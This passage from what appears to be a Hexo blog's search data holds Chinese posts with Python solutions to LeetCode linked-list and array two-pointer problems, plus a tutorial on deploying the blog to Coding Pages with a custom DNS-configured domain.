1-&gt;2-&gt;3-&gt;4示例 2:12输入: -1-&gt;5-&gt;3-&gt;4-&gt;0输出: -1-&gt;0-&gt;3-&gt;4-&gt;5思路我这里用归并排序实现链表的排序。采用的是递归方法。通过递归实现链表归并排序，有以下两个环节：分割、排序环节：首先找到当前链表中点，并从中点将链表断开，以便在下次递归分割排序时，链表片段拥有正确边界：我们使用 fast,slow 快慢双指针法，奇数个节点找到中点，偶数个节点找到中心左边的节点。找到中点 slow 后，执行 slow.next = None 将链表切断。递归分割时，输入当前链表左端点head和中心节点 slow 的下一个节点mid（因为链表是从 slow 切断的）。递归终止条件：当head.next == None时，说明只有一个节点了，直接返回此节点。合并环节：我们将两个排序链表合并，转化为一个排序链表。这个过程跟第21题是一样的。Sort List （归并排序链表）Python实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849class Solution: def sortList(self, head: ListNode) -&gt; ListNode: # 递归终止条件 if head == None: return None if head.next == None: return head # 双指针寻找链表中点 slow = head fast = head while fast.next != None and fast.next.next != None: slow = slow.next fast = fast.next.next # 中点处切断链表，得到两个链表 mid = slow.next slow.next = None # 递归 l1 = self.sortList(head) l2 = self.sortList(mid) return self.merge(l1,l2) # 合并函数 def merge(self, l1, l2): dummy = ListNode(0) cur = dummy while l1 != None or l2 != None: # l1链表已经取完 if l1 == None: cur.next = l2 break # l2链表已经取完 if l2 == None: cur.next = l1 break if l1.val &gt;= l2.val: cur.next = ListNode(l2.val) cur = cur.next l2 = l2.next else: cur.next = ListNode(l1.val) cur = cur.next l1 = l1.next return dummy.next注意：递归调用函数将带来O(logn)的空间复杂度，因此若希望达到O(1)空间复杂度，则不能使用递归。反转类题目单向链表的反转是一个非常常见的链表类面试题。最简单易懂的办法就是使用一个数组来存储链表中的结点信息，比如结点的数据值等，之后根据题目要求对数组进行相关操作后，再重新把数组元素做为每一个结点连接成链表返回。但是这种办法空间复杂度达到了 O(n)，为了保证O(1)的空间复杂度，我们需要在原单链表的数据结构上，进行单链表反转，我们可以使用迭代或者递归完成。迭代：从前往后依次处理，直到循环到链尾递归：先一直迭代到链尾，也就是递归基判断的准则，然后再逐层返回处理到开头下面是几个常见的题目：206-反转链表92-反转链表ii25-k个一组翻转链表206-反转链表题目描述反转一个单链表。示例:12输入: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL输出: 5-&gt;4-&gt;3-&gt;2-&gt;1-&gt;NULL进阶:你可以迭代或递归地反转链表。你能否用两种方法解决这道题？思路举例而言，现在我们有一个三个不同结点组成的链表 A → B → C，需要反转结点中的链接成为 A ← B ← C。假设我们有两个指针，一个指向结点 A，一个指向结点 B。 分别记为 pre 和 cur。则可以用这两个指针简单地实现 A 和 B 之间的链接反转：1cur.next = pre这样做唯一的问题是，没有办法继续下去，换而言之，这样做之后就无法再访问到结点 C。因此，我们需要引入第三个指针，用于帮助反转过程的进行。因此，我们不采用上面的反转方法，而是：1234temp = cur.nextcur.next = prepre = curcur = temp迭代地进行上述过程，即可完成问题的要求。Python实现123456789101112class Solution: def reverseList(self, head: ListNode) -&gt; ListNode: pre = None cur = head while cur != None: temp = cur.next cur.next = pre pre = cur cur = temp return pre这里要注意下，pre初始设置为None，保证了最后反转过来的链表最后指向的是None。时间复杂度：O(n)。空间复杂度：O(1)。92-反转链表ii题目描述反转从位置 m 到 n 的链表。请使用一趟扫描完成反转。说明:1 ≤ m ≤ n ≤ 链表长度。示例:12输入: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL, m = 2, n = 4输出: 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;NULL思路我们需要两个指针 pre 和 cur。pre 指针初始化为 None，cur 指针初始化为链表的 head。然后我们同时向前推进 cur 指针，prev 指针跟随其后，直到 cur 指针到达从链表头起的第 m 个结点。这就是我们反转链表的起始位置。这时候我们要引入两个额外指针，分别称为 tail 和 con。tail 指针指向从链表头起的第m个结点，此结点是反转后链表的尾部，故称为 tail。con 指针指向第 m 个结点的前一个结点，此结点是新链表的头部。tail 和 con 指针将在算法最后被调用，用于完成链表反转。当 cur 指针抵达第 m 个结点后，迭代地反转链接，直到完成指向第 n 个结点的链接。此时，pre 指针会指向第 n 个结点。这时候，我们使用 con 指针来连接 pre 指针，类似地，我们利用 tail 指针来连接 pre 指针之后的结点（第 n+1 个结点）。下面是一个例子，给定一个链表 7 → 9 → 2 → 10 → 1 → 8 → 6，我们需要反转从第 3 个结点到第 6 个结点的子链表。具体过程如下：从上图可以看到迭代法的前几步。第一步展示了两个指针的初始化，第三步显示链表到达了反转过程的初始位置。上图详细显示了链接反转的过程以及反转两个结点的链接后如何向前移动。如下图所示，本步骤将执行多次。 如上图所示, 两个指针都已经到达最终位置。我们完成了子链表的反转工作。然而，还有一些链接需要调整。下图展示了利用 tail 和 con 指针完成链接调整的过程。反转链表IIPython实现123456789101112131415161718192021222324252627282930313233class Solution: def reverseBetween(self, head: ListNode, m: int, n: int) -&gt; ListNode: # 初始化pre、cur pre = None cur = head # cur 指针抵达第 m 个结点 while m &gt; 1: pre = cur cur = cur.next m -= 1 n -= 1 # 初始化con、tail con = pre tail = cur # 链表反转 while n &gt; 0: temp = cur.next cur.next = pre pre = cur cur = temp n -= 1 # con、tail链接调整 if con: con.next = pre else: head = pre tail.next = cur return head25-k个一组翻转链表题目描述给你一个链表，每 k 个节点一组进行翻转，请你返回翻转后的链表。k 是一个正整数，它的值小于或等于链表的长度。如果节点总数不是 k 的整数倍，那么请将最后剩余的节点保持原有顺序。示例 :12345给定这个链表：1-&gt;2-&gt;3-&gt;4-&gt;5当 k = 2 时，应当返回: 2-&gt;1-&gt;4-&gt;3-&gt;5当 k = 3 时，应当返回: 3-&gt;2-&gt;1-&gt;4-&gt;5说明：你的算法只能使用常数的额外空间。你不能只是单纯的改变节点内部的值，而是需要实际的进行节点交换。思路具体步骤如下：链表分区为已翻转部分+待翻转部分+未翻转部分。每次翻转前，要确定翻转链表的范围，这个必须通过 k 次循环来确定，需记录翻转链表前驱（代码中的l_old，下图的pre）和后继（代码中的l_new，下图的next），方便翻转完成后把已翻转部分和未翻转部分连接起来。同时，k个一组的链表的头和尾我用start和end表示，start初始位于k个链表的第一个，而end初始位于其前驱。经过k次循环，end 到达末尾，记录待翻转链表的后继 l_new = end.next，并把end断开，如下图第四行。反转链表。然后将三部分链表连接起来，然后重置 l_old（下图的pre） 和 end 指针，然后进入下一次循环。图解k个一组翻转链表Python实现1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950class Solution: def reverseKGroup(self, head: ListNode, k: int) -&gt; ListNode: dummy = ListNode(0) dummy.next = head l_old = dummy end = dummy start = head while True: # k次循环，end到达一组的末尾 for _ in range(k): end = end.next if end == None: break # 链表到达末尾（剩余不够k个） if end == None: break # 分割开后面的链表 l_new = end.next end.next = None # 反转这k个链表（返回的是反转后的头节点） temp = self.reverse(start) # 前面部分已反转完成的链表接上这个头节点 l_old.next = temp # 更新这几个指针 l_old = start end = start start.next = l_new start = start.next return dummy.next # 反转链表 def reverse(self, head): dummy = ListNode(0) pre = dummy cur = head while cur != None: temp = cur.next cur.next = pre pre = cur cur = temp return pre双指针问题双指针算法，就是指的是在遍历的过程中，不是普通的使用单个指针进行循环访问，而是使用两个相同方向或者相反方向的指针进行扫描，从而达到相应的目的。链表题目主要用的是相同方向的双指针，也就是快慢指针。快慢指针是两个指针从同一侧开始遍历数组，将这两个指针分别定义为快指针（fast）和慢指针（slow），两个指针以不同的策略移动，直到两个指针的值相等（或其他特殊条件）为止，如 fast 每次增长两个，slow 每次增长一个。下面是几个常见的题目：19-删除链表的倒数第N个节点83-删除排序链表中的重复元素82-删除排序链表中的重复元素ii141-环形链表142-环形链表ii234-回文链表328-奇偶链表19-删除链表的倒数第N个节点题目描述给定一个链表，删除链表的倒数第 n 个节点，并且返回链表的头结点。示例：12给定一个链表: 1-&gt;2-&gt;3-&gt;4-&gt;5, 和 n = 2.当删除了倒数第二个节点后，链表变为 1-&gt;2-&gt;3-&gt;5.说明：给定的 n 保证是有效的。进阶：你能尝试使用一趟扫描实现吗？思路首先我们将添加一个哑结点作为辅助，该结点位于列表头部。哑结点用来简化某些极端情况，例如列表中只含有一个结点，或需要删除列表的头部。我们可以使用两个指针而不是一个指针。第一个指针从列表的开头向前移动 n+1 步，而第二个指针将从列表的开头出发。现在，这两个指针被 n 个结点分开。我们通过同时移动两个指针向前来保持这个恒定的间隔，直到第一个指针到达最后一个结点。此时第二个指针将指向从最后一个结点数起的第 n 个结点。我们重新链接第二个指针所引用的结点的 next 指针指向该结点的下下个结点。删除链表的倒数第N个节点Python实现123456789101112131415161718192021class Solution: def removeNthFromEnd(self, head: ListNode, n: int) -&gt; ListNode: # 设置哑头节点，简化某些极端情况，例如列表中只含有一个结点，或需要删除列表的头部。 dummy = ListNode(0) dummy.next = head slow = dummy fast = dummy # 快指针先走n+1步 for _ in range(n+1): fast = fast.next # 两个指针一起移动，直到快指针到达None while fast != None: slow = slow.next fast = fast.next # 删除慢指针指向的节点，也就是倒数第n个节点 slow.next = slow.next.next return dummy.next83-删除排序链表中的重复元素问题描述给定一个排序链表，删除所有重复的元素，使得每个元素只出现一次。示例 1:输入: 1-&gt;1-&gt;2输出: 1-&gt;2示例 2:输入: 1-&gt;1-&gt;2-&gt;3-&gt;3输出: 1-&gt;2-&gt;3思路我首先想到可以把链表中的元素放入到一个集合set中，然后从头开始循环往下找，如果下一个结点的值在集合中出现过，那么更改当前结点的next指针，跳出下一个结点。但是这样就没有用到输入的链表已排序这个条件。其实我们可以将结点的值与它之后的结点进行比较来确定它是否为重复结点。如果它是重复的，我们更改当前结点的 next 指针，以便它跳过下一个结点并直接指向下一个结点之后的结点。Python实现123456789101112class Solution: def deleteDuplicates(self, head: ListNode) -&gt; ListNode: current = head while current != None and current.next != None: if current.val == current.next.val: current.next = current.next.next else: current = current.next return head82-删除排序链表中的重复元素ii题目描述给定一个排序链表，删除所有含有重复数字的节点，只保留原始链表中 没有重复出现 的数字。示例 1:12输入: 1-&gt;2-&gt;3-&gt;3-&gt;4-&gt;4-&gt;5输出: 1-&gt;2-&gt;5示例 2:12输入: 1-&gt;1-&gt;1-&gt;2-&gt;3输出: 2-&gt;3思路为了避免开头就出现重复数字，因此先加空头。这里采用快慢指针，用快指针跳过那些有重复数组，慢指针负责和快指针拼接。下面是一个图解：来源：循环解法，简单高效，图解Python实现1234567891011121314151617181920212223242526272829303132class Solution: def deleteDuplicates(self, head: ListNode) -&gt; ListNode: if head == None: return None # 创建空头 dummy = ListNode(0) pre = dummy # 循环判断 cur = head is_duplicate = False while cur != None and cur.next != None: if cur.val == cur.next.val: is_duplicate = True cur = cur.next else: if is_duplicate: cur = cur.next is_duplicate = False else: # 这里要新建一个ListNode，而不是直接pre.next = cur pre.next = ListNode(cur.val) pre = pre.next cur = cur.next # 链表最后一个数处理 if is_duplicate == False: pre.next = ListNode(cur.val) pre = pre.next return dummy.next141-环形链表题目描述给定一个链表，判断链表中是否有环。为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。示例 1：123输入：head = [3,2,0,-4], pos = 1输出：true解释：链表中有一个环，其尾部连接到第二个节点。示例 2：123输入：head = [1,2], pos = 0输出：true解释：链表中有一个环，其尾部连接到第一个节点。示例 3：123输入：head = [1], pos = -1输出：false解释：链表中没有环。进阶：你能用 O(1)（即，常量）内存解决此问题吗？思路环形链表，即原本末尾的节点的 next 指针，指向了链表的任意一个节点，形成了一个闭环。在这种环形链表中，遍历时会停不下来，因为在环中会一直循环，这是它的特点。我们设置两个指针：慢指针和快指针，慢指针每次移动一步，而快指针每次移动两步。我们可以把慢指针和快指针想象成两个在环形赛道上跑步的运动员（分别称之为慢跑者与快跑者）。而快跑者最终一定会追上慢跑者。而如果列表中不存在环，最终快指针将会最先到达尾部，此时我们可以返回 false。Python实现123456789101112131415class Solution: def hasCycle(self, head: ListNode) -&gt; bool: dummy = ListNode(0) dummy.next = head slow = dummy fast = dummy while fast.next != None and fast.next.next != None: slow = slow.next fast = fast.next.next if slow == fast: return True return False142-环形链表ii题目描述给定一个链表，返回链表开始入环的第一个节点。 如果链表无环，则返回 null。为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。说明：不允许修改给定的链表。示例 1：123输入：head = [3,2,0,-4], pos = 1输出：tail connects to node index 1解释：链表中有一个环，其尾部连接到第二个节点。示例 2：123输入：head = [1,2], pos = 0输出：tail connects to node index 0解释：链表中有一个环，其尾部连接到第一个节点。示例 3：123输入：head = [1], pos = -1输出：no cycle解释：链表中没有环。思路首先我们设两指针 fast，slow 指向链表头部 head，fast 每轮走 2 步，slow 每轮走 1 步。如果fast指针走到链表末端，说明链表无环，直接返回 null。如果有环的话，两指针一定会相遇。设链表共有 a+b 个节点，其中 链表头部到链表入口 有 a 个节点（不计链表入口节点）， 链表环 有 b 个节点，两指针分别走了 f，s 步。当两指针在环中第一次相遇时，fast与slow走过的步数关系如下：fast 走的步数是slow步数的 2 倍，即 f = 2sfast 比 slow多走了 n 个环的长度，即 f = s + nb（双指针都走过 a 步，然后在环内绕圈直到重合，重合时 fast 比 slow 多走 环的长度的整数倍）以上两式相减得：f = 2nb，s = nb，即fast和slow指针分别走了2n、n个环的周长 双指针第二次相遇：我们会发现，所有走到链表入口节点时的步数是：a+nb（先走 a 步到入口节点，之后每绕 1 圈环都会再次到入口节点）。而目前，slow 指针走过的步数为 nb 步。因此，我们只要想办法让 slow 再走 a 步停下来，就可以到环的入口。但是我们不知道 a 的值，该怎么办？我们依然可以使用双指针法。我们可以在链表头部head构建一个指针，此指针和slow一起向前走 a 步后，两者在入口节点重合。 环形链表 II（双指针法，清晰图解）Python实现123456789101112131415161718192021222324class Solution: def detectCycle(self, head: ListNode) -&gt; ListNode: dummy = ListNode(0) dummy.next = head slow = dummy fast = dummy while True: # 链表无环 if fast.next == None or fast.next.next == None: return None slow = slow.next fast = fast.next.next # 双指针第一次相遇 if slow == fast: break # 构造第二次相遇 fast = dummy while slow != fast: slow = slow.next fast = fast.next return slow234-回文链表题目描述请判断一个链表是否为回文链表。示例 1:12输入: 1-&gt;2输出: false示例 2:12输入: 1-&gt;2-&gt;2-&gt;1输出: true进阶：你能否用 O(n) 时间复杂度和 O(1) 空间复杂度解决此题？思路这道题目可以用快慢指针+反转链表解决。使用快慢指针找到链表的中间位置，然后将链表分为两个部分反转后半部分链表逐一对比前后两部分链表注意：如果链表长度是偶数的话，前半部分和后半部分长度是一样的。如果链表长度是奇数，那么前半部分的长度比后半部分长度多1个，所以最后迭代链表的时候，以后半部分为准就可以了，当链表总长为奇数时，前半部分的最后一个节点就不会被遍历到了。Python实现123456789101112131415161718192021222324252627282930313233class Solution: def isPalindrome(self, head: ListNode) -&gt; bool: if head == None: return True # 快慢指针求得链表中点 slow = head fast = head while fast.next != None and fast.next.next != None: slow = slow.next fast = fast.next.next # 中点处断开 cur = slow.next slow.next = None # 反转后半个链表 pre = None while cur != None: temp = cur.next cur.next = pre pre = cur cur = temp # 判断两个链表是否是回文链表 l1 = head l2 = pre while l2 != None: if l2.val != l1.val: return False l2 = l2.next l1 = l1.next return True328-奇偶链表题目描述给定一个单链表，把所有的奇数节点和偶数节点分别排在一起。请注意，这里的奇数节点和偶数节点指的是节点编号的奇偶性，而不是节点的值的奇偶性。请尝试使用原地算法完成。你的算法的空间复杂度应为 O(1)，时间复杂度应为 O(nodes)，nodes 为节点总数。示例 1:12输入: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL输出: 1-&gt;3-&gt;5-&gt;2-&gt;4-&gt;NULL示例 2:12输入: 2-&gt;1-&gt;3-&gt;5-&gt;6-&gt;4-&gt;7-&gt;NULL 输出: 2-&gt;3-&gt;6-&gt;7-&gt;1-&gt;5-&gt;4-&gt;NULL说明：应当保持奇数节点和偶数节点的相对顺序。链表的第一个节点视为奇数节点，第二个节点视为偶数节点，以此类推。思路我们可以利用两个指针完成分离：第一个指针odd连接奇数位结点，第二个指针even连接偶数位结点。分离结束后将odd段链表的尾指针指向even链表的head（即evenHead）。双指针(c++)Python实现12345678910111213141516171819202122class Solution: def oddEvenList(self, head: ListNode) -&gt; ListNode: # 特殊情况处理 if head == None or head.next == None: return head # 奇偶指针初始化 odd = head even = head.next evenHead = even # 奇偶指针分离 while even != None and even.next != None: odd.next = odd.next.next odd = odd.next even.next = even.next.next even = even.next # 奇数链表的尾指针指向偶数链表的头指针 odd.next = evenHead return head数学问题这部分包括一些非常典型的数学基本操作和链表基本操作题。2-两数相加2-两数相加题目描述给出两个 非空 的链表用来表示两个非负的整数。其中，它们各自的位数是按照 逆序 的方式存储的，并且它们的每个节点只能存储 一位 数字。如果，我们将这两个数相加起来，则会返回一个新的链表来表示它们的和。您可以假设除了数字 0 之外，这两个数都不会以 0 开头。示例：123输入：(2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)输出：7 -&gt; 0 -&gt; 8原因：342 + 465 = 807思路我们可以将两个链表看成是相同长度的进行遍历，如果一个链表较短则在前面补 0，比如 987 + 23 = 987 + 023 = 1010每一位计算需要考虑上一位的进位问题，而当前位计算结束后同样需要更新进位值如果两个链表全部遍历完毕后，进位值为 1，则在新链表最前方添加节点 1流程1流程2流程3流程4流程5流程6流程7流程8画解算法：2. 两数相加Python实现12345678910111213141516171819202122232425262728293031class Solution: def addTwoNumbers(self, l1: ListNode, l2: ListNode) -&gt; ListNode: # 初始化结果链表 cur = ListNode(0) head = cur carry = 0 while l1 != None or l2 != None: # 如果一个链表较短则在前面补0 if l1 == None: x1 = 0 else: x1 = l1.val l1 = l1.next if l2 == None: x2 = 0 else: x2 = l2.val l2 = l2.next # 每一位计算的同时需要考虑上一位的进位问题，而当前位计算结束后同样需要更新进位值 sums = (x1 + x2 + carry)%10 carry = (x1 + x2 + carry)//10 cur.next = ListNode(sums) cur = cur.next # 如果两个链表全部遍历完毕后，进位值为 1，则在新链表最前方添加节点 1 if carry == 1: cur.next = ListNode(carry) return head.next参考leetcode链表问题汇总与解题思路总结[Leetcode][链表]相关题目汇总/分析/总结链表翻转的图文讲解（递归与迭代两种实现）（百度面试）LeetCode链表知识点&amp;题型总结&amp;题表]]></content>
      <categories>
        <category>计算机基础</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>双指针</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo博客部署到Coding]]></title>
    <url>%2Farchives%2Fe09249d2.html</url>
    <content type="text"><![CDATA[GitHub 服务器毕竟是在国外，国内访问的速度比较慢。而Coding是国内的一个面向开发者的云端开发平台，这意味着能够大大提升国内的访问速度。本文简单记录了Hexo博客部署到Coding的过程。创建Coding仓库首先官网注册账号。注册完账号之后，请前个人账户的设置页面选择 SSH 公钥将本地生成的 公钥 添加进去。公钥储存位置一般在 C:\Users\用户名\.ssh 目录下的 id_rsa.pub 文件里，用记事本打开复制其内容即可。创建一个托管静态页面的仓库项目名称任意，但是最好是自己在 Coding 上设置的账户名。因为当我们的项目推送成功并开启Pages服务后，其访问地址为username.coding.me/projectname。而当你的projectname与username相同的时候，其访问地址可以简化为username.coding.me。项目描述随意填写公开源代码：建议不勾选，这样仓库就只能自己查看启用 README.md、添加 License 文件和添加 .gitignore 文件均可以不用理会，使用默认的就好部署到Coding仓库现在我们将 public 目录推送到 Coding 上博客仓库的 master 分支。我们只需要改下站点的配置文件，添加如下代码：123- type: git repository: git@git.dev.tencent.com:tding/tding.git branch: master然后hexo deploy即可部署成功。开启Coding Pages服务博客部署完成后，我们在代码 ——&gt; Pages服务中一键开启Coding Pages服务。在浏览器中直接输入域名，即仓名（如tding.coding.me）查看是否部署成功。添加自定义域名首先得有一个自定义域名，然后我们把它绑定到Coding上。这里我用DNSPod来提供域名解析服务。添加解析记录我们需要在DNSPod控制台的DNS管理中添加两条解析记录：记录类型为A，主机记录为@，解析线路选择默认，记录值为你Hexo项目所部署到Coding Pages的IP地址，可以通过ping得到。如我的Coding仓库为tding.coding.me，则打开cmd，输入ping tding.coding.me，就可以得到Coding Pages的IP地址。我这里是150.109.112.233。记录类型为CNAME，主机记录为www，解析线路选择默认，记录值为你Hexo项目所部署到Coding Pages的访问地址，如我的为tding.coding.me。注意：因为我们要实现国内外访问不同的服务，所以需要分别设置解析，无论是腾讯云还是阿里云的解析服务，都能够很好的区分国内外节点，我们需要将国内的 CNAME 设置到 pages.coding.me，将国外的 CNAME 设置到 pages.github.io。具体如下图：Coding绑定自定义域名打开Coding的Pages服务，进入设置页面，为网站绑定自己的域名。添加刚才解析的两条记录。注意：一定要选首选的域名，并且非首选域名要勾选跳转至首选域名，不然有些第三方服务数据会统计不到一起。开启HTTPS如果你之前已经部署到了 GitHub Pages 并开启了 HTTPS，那么直接在设置页面绑定你自己的域名，SSL/TLS 安全证书就会显示申请错误。申请错误原因是：在验证域名所有权时会定位到 Github Pages 的主机上导致 SSL 证书申请失败。正确的做法是：先去域名 DNS 把 GitHub 的解析暂停掉，然后再重新申请 SSL 证书，大约十秒左右就能申请成功，然后开启强制 HTTPS 访问。速度对比至此，我们完成了博客在 GitHub Pages 和 Coding Pages 双线部署。下面是一张 GitHub Pages 和 Coding Pages 在国内的速度对比图，可以明显看到速度的提升：参考域名申请与绑定到Coding PagesHexo 双线部署到 Coding Pages 和 GitHub Pages 并实现全站 HPPTS]]></content>
      <categories>
        <category>工具使用</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>GitHub Pages</tag>
        <tag>Coding Pages</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LeetCode题目总结-数组中的双指针问题]]></title>
    <url>%2Farchives%2F647f3958.html</url>
    <content type="text"><![CDATA[所谓双指针算法，就是指的是在遍历的过程中，不是普通的使用单个指针进行循环访问，而是使用两个相同方向或者相反方向的指针进行扫描，从而达到相应的目的。双指针法充分使用了数组有序这一特征，从而在某些情况下能够简化一些运算，降低时间复杂度.本文主要总结了几种双指针算法在数组类题目中的应用，下面是目录：对撞指针前向型指针-快慢指针前向型指针-滑动窗口分离双指针对撞指针对撞指针是指在有序数组中，将指向最左侧的索引定义为左指针(left)，最右侧的定义为右指针(right)，然后从两头向中间进行数组遍历。1-两数之和15-三数之和16-最接近的三数之和18-四数之和167-两数之和-输入有序数组11-盛最多水的容器42-接雨水611-有效三角形的个数1-两数之和题目描述给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那两个整数，并返回他们的数组下标。你可以假设每种输入只会对应一个答案。但是，你不能重复利用这个数组中同样的元素。示例:给定 nums = [2, 7, 11, 15], target = 9因为 nums[0] + nums[1] = 2 + 7 = 9，所以返回 [0, 1]思路我们马上可以想到一个暴力解法：遍历每个元素 x，并查找是否存在一个值与 target - x 相等的目标元素。但是这个方法时间复杂度达到O(n^2)。因此，我想到用哈希表以空间换取速度，将查找时间从 O(n) 降低到 O(1)。在进行迭代并将元素插入到哈希表的同时，我们还会回过头来检查表中是否已经存在当前元素所对应的目标元素。如果它存在，那我们已经找到了对应解，并立即将其返回。注意：这里没有使用对撞指针，因为这里数组是无序的，而排序的时间复杂度为O(nlogn)，所以不太划算。Python实现123456789class Solution: def twoSum(self, nums, target): nums_dict = &#123;&#125; for i in range(len(nums)): temp = target - nums[i] if temp in nums_dict: return [i,nums_dict[temp]] else: nums_dict[nums[i]] = i时间复杂度：O(n)，我们只遍历了包含有 n 个元素的列表一次。在表中进行的每次查找只花费 O(1) 的时间。空间复杂度：O(n)，所需的额外空间取决于哈希表中存储的元素数量，该表最多需要存储 n 个元素。15-三数之和题目描述给定一个包含 n 个整数的数组 nums，判断 nums 中是否存在三个元素 a，b，c ，使得 a + b + c = 0 ？找出所有满足条件且不重复的三元组。注意：答案中不可以包含重复的三元组。例如, 给定数组 nums = [-1, 0, 1, 2, -1, -4]，满足要求的三元组集合为：1234[ [-1, 0, 1], [-1, -1, 2]]思路这里思路来源于167- 两数之和 II - 输入有序数组。我们可以先对数组进行排序，然后我们选择一个数字做C位，然后我们在这个C位数字的右边进行双指针搜索：从最左边i+1（最小值）和最右边len(nums)-1（最大值）两个数字开始，加上C位，计算总和是否等于0。如果大于 0，说明实力太强了，就把右侧的数字左移一位。如果小于 0，说明实力太弱了，就把左边的数字右移一位。当双指针碰到的时候，这轮循环结束，以该数字为C位的所有可能都已经尝试完毕了。这里要注意数组的去重，去重过程包含了遍历，也会增加时间复杂度，所以我进行了优化，对于排序完成的数组来说，只要判断下相邻的数是否相等，如果相等就直接移动指针即可，这就完成了去重。Python实现123456789101112131415161718192021222324252627282930313233class Solution: def threeSum(self,nums): # 排序 nums.sort() # 单循环+双指针 res = [] for i in range(len(nums)): # 去重（如果当前C位数和相邻的数相等，直接移动指针） if i &gt; 0 and nums[i] == nums[i-1]: continue left = i + 1 right = len(nums) - 1 while left &lt; right: if nums[i] + nums[left] + nums[right] &gt; 0: right -= 1 elif nums[i] + nums[left] + nums[right] &lt; 0: left += 1 elif nums[i] + nums[left] + nums[right] == 0: res.append([nums[i],nums[left],nums[right]]) # 去重（如果当前数和相邻的数相等，直接移动指针） while left &lt; right and nums[left] == nums[left+1]: left += 1 while left &lt; right and nums[right] == nums[right-1]: right -= 1 left += 1 right -= 1 return res时间复杂度：O(n^2)16-最接近的三数之和问题描述给定一个包括 n 个整数的数组 nums 和 一个目标值 target。找出 nums 中的三个整数，使得它们的和与 target 最接近。返回这三个数的和。假定每组输入只存在唯一答案。123例如，给定数组 nums = [-1，2，1，-4], 和 target = 1.与 target 最接近的三个数的和为 2. (-1 + 2 + 1 = 2).思路这个题目跟15-三数之和类似，只是需要保存一下最接近target的值，搜索过程中碰到更接近的数就更新这个值。具体步骤如下：在数组 nums 中，进行遍历，每遍历一个值利用其下标i，形成一个固定值 nums[i]。使用前指针指向 left = i + 1 处，后指针指向 right = len(nums) - 1 处，也就是结尾处，根据 sums = nums[i] + nums[left] + nums[right] 的结果，判断 sums 与目标 target 的距离，如果更近则更新结果a。因为数组有序，如果 sums &gt; target 则 right -= 1，如果 sums &lt; target 则 left += 1，如果 sums == target 则说明距离为 0，直接返回结果。Python实现1234567891011121314151617181920212223242526272829class Solution: def threeSumClosest(self, nums: List[int], target: int) -&gt; int: # 排序 nums.sort() # 初始化 a = abs(nums[0] + nums[1] + nums[2] - target) res = nums[0] + nums[1] + nums[2] for i in range(len(nums)): left = i + 1 right = len(nums) - 1 # 当前nums[i]情况下，搜索最接近的组合 while left &lt; right: sums = nums[i] + nums[left] + nums[right] # 比较sums与目标target的距离与之前最近的距离，如果更近则更新 if abs(sums-target) &lt; a: a = abs(sums-target) res = sums if sums &gt; target: right -= 1 elif sums &lt; target: left += 1 # 如果sums == target，则说明距离为0，这就是最接近的数 elif sums == target: return sums return res18-四数之和题目描述给定一个包含 n 个整数的数组 nums 和一个目标值 target，判断 nums 中是否存在四个元素 a，b，c 和 d ，使得 a + b + c + d 的值与 target 相等？找出所有满足条件且不重复的四元组。注意：答案中不可以包含重复的四元组。示例：12345678给定数组 nums = [1, 0, -1, 0, -2, 2]，和 target = 0。满足要求的四元组集合为：[ [-1, 0, 0, 1], [-2, -1, 1, 2], [-2, 0, 0, 2]]思路这道题目跟15.三数之和基本类似，也可以采用对撞指针进行解决，只是外面多了一个循环。其中的难点在于四元组的去重。最简单的办法是在结果列表中进行查找判断是否有重复的四元组，如果没有再存入，但是效率比较低，这里我采用如果当前值等于之前的值，那么我就跳过这个数来去重。Python实现1234567891011121314151617181920212223242526272829303132333435363738class Solution: def fourSum(self, nums: List[int], target: int) -&gt; List[List[int]]: # 排序 nums.sort() res = [] for i in range(len(nums)-3): # 去重：确保nums[i]改变了 if i &gt; 0 and nums[i] == nums[i-1]: continue for j in range(i+1,len(nums)-2): # 去重：确保nums[j]改变了 if j &gt; i+1 and nums[j] == nums[j-1]: continue left = j + 1 right = len(nums) - 1 while left &lt; right: sums = nums[i] + nums[j] + nums[left] + nums[right] if sums == target: res.append([nums[i],nums[j],nums[left],nums[right]]) # 去重：确保nums[left]改变了 while left &lt; right and nums[left] == nums[left+1]: left += 1 # 去重：确保nums[right]改变了 while left &lt; right and nums[right] == nums[right-1]: right -= 1 left += 1 right -= 1 elif sums &lt; target: left += 1 elif sums &gt; target: right -= 1 return res时间复杂度：O(n^3)167-两数之和-输入有序数组问题描述给定一个已按照 升序排列 的有序数组，找到两个数使得它们相加之和等于目标数。函数应该返回这两个下标值 index1 和 index2，其中 index1 必须小于 index2。说明:返回的下标值（index1 和 index2）不是从零开始的。你可以假设每个输入只对应唯一的答案，而且你不可以重复使用相同的元素。示例:输入: numbers = [2, 7, 11, 15], target = 9输出: [1,2]解释: 2 与 7 之和等于目标数 9 。因此 index1 = 1, index2 = 2 。思路我们可以使用 两数之和 的解法在 O(n^2) 时间 O(1) 空间暴力解决，也可以用哈希表在 O(n) 时间和 O(n) 空间内解决。然而，这两种方法都没有用到输入数组已经排序的性质，我们可以做得更好。我们使用两个指针，初始分别位于第一个元素和最后一个元素位置，比较这两个元素之和与目标值的大小。如果和等于目标值，我们发现了这个唯一解。如果比目标值小，我们将较小元素指针增加一。如果比目标值大，我们将较大指针减小一。移动指针后重复上述比较直到找到答案。Python实现1234567891011class Solution: def twoSum(self, numbers, target): i = 0 j = len(numbers)-1 while True: if numbers[i] + numbers[j] &gt; target: j -= 1 elif numbers[i] + numbers[j] &lt; target: i += 1 elif numbers[i] + numbers[j] == target: return [i+1,j+1]11-盛最多水的容器题目描述给定 n 个非负整数 a1，a2，…，an，每个数代表坐标中的一个点 (i, ai) 